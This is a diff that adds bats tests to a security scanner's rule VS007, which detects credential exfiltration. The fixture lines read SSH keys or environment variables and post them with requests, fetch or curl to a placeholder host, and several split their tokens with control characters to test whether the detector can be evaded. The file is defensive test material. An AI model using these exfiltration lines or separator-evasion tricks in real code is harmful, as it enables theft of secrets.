@@ -399,3 +399,35 @@ rules_in() { scan | jq -r '[.findings[].rule] | unique | join(",")'; }
   run timeout 30 python3 -I "$T" "$D"
   [ "$status" -ne 124 ]
 }
+
+@test "VS007 is not evaded by a separator inside either half" {
+  local n=0
+  while IFS='|' read -r a b; do
+    n=$((n+1)); rm -f "$D"/*
+    printf "$a\n$b\n" > "$D/f$n.py"
+    run scan
+    [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS007")] | length')" -ge 1 ] || { echo "case $n: $a / $b"; false; }
+  done <<'CASES'
+k = "~/.ss\x0bh/id"|requests.post(u, data=k)
+k = os.\x0cenviron|requests.post(u, data=k)
+k = "id_\xc2\x85rsa"|requests.post(u, data=k)
+k = "~/.ssh/id"|requests.po\x0bst(u, data=k)
+k = "~/.ssh/id"|fetch\x0c(u)
+k = "~/.ssh/id"|cu\x0brl -d @k http://c.example.invalid
+CASES
+}
+@test "VS007 flags curl with a data flag however far along the line it sits" {
+  { printf 'k=~/.ssh/id\ncurl http://c.example.invalid/'; head -c 320 /dev/zero | tr '\0' 'a'; printf ' -d @x\n'; } > "$D/a.sh"
+  run scan
+  [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS007")] | length')" = "1" ]
+}
+@test "VS007 stays quiet on curl with no data flag" {
+  put a.sh $'k=~/.ssh/id\ncurl https://c.example.invalid/page -o out.html --max-time 5'
+  run rules_in; [[ "$output" != *VS007* ]] || false
+}
+@test "VS007 reporting stays fast on a 1 MB line of separators and curl" {
+  { printf '.env '; for i in $(seq 100000); do printf 'curl\x0b-x '; done; } > "$D/a.sh"
+  { for i in $(seq 200000); do printf 'curl '; done; printf '.env'; } > "$D/b.sh"
+  run timeout 30 python3 -I "$T" "$D"
+  [ "$status" -ne 124 ]
+}
